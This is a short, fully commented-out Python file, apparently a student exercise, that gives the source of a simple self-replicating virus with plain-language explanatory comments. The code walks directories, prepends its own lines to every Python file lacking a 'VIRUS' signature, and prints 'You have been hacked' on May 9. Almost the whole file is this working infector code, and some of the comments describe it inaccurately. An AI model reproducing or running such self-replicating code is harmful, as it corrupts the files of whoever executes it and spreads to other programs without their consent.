# #!/usr/bin/python
# import os
# import datetime

# SIGNATURE = "VIRUS"

# def locate(path):
#     files_targeted = []
#     filelist = os.listdir(path)
#     for fname in filelist:
#         if os.path.isdir(path+"/"+fname):
#             files_targeted.extend(locate(path+"/"+fname))
#         elif fname[-3:] == ".py":
#             infected = False
#             for line in open(path+"/"+fname):
#                 if SIGNATURE in line:
#                     infected = True
#                     break
#             if infected == False:
#                 files_targeted.append(path+"/"+fname)
#     return files_targeted
#The virus is searching for files that are python files that are already inifected and telling you if they are infected or not using and if and elif statement

# def infect(files_targeted):
#     virus = open(os.path.abspath(__file__))
#     virusstring = ""
#     for i,line in enumerate(virus):
#         if 0 <= i < 39:
#             virusstring += line
#     virus.close
#     for fname in files_targeted:
#         f = open(fname)
#         temp = f.read()
#         f.close()
#         f = open(fname,"w")
#         f.write(virusstring + temp)
#         f.close()
# The virus is opening up a file that is targeted and writing its code into the file and infecting the file.
# def detonate():
#     if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
#         print "You have been hacked"

# files_targeted = locate(os.path.abspath(""))
# infect(files_targeted)
# detonate()
# This last bit is setting a time and date that the virus will activate and hack the person computer and tell them they have been hacked 
# and run the file infecting the pc
